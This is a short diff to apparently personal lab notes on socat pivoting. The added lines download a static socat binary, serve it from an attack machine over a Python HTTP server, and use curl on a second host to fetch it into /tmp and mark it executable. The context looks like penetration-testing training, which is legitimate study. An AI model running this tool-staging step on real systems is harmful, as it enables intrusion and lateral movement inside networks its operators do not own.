@@ -79,3 +79,8 @@ Reverse Connections
 
 TASK-12
 SOCAT - Pivoting
+Download statuc binary from here >> https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
+Open a http server on the attack machine >> sudo python3 -m http.server 9090
+On other machine dowload this with >> curl http://10.50.82.233:9090/socat -o /tmp/socat-4lch3my && chmod +x /tmp/socat-4lch3my
+
+
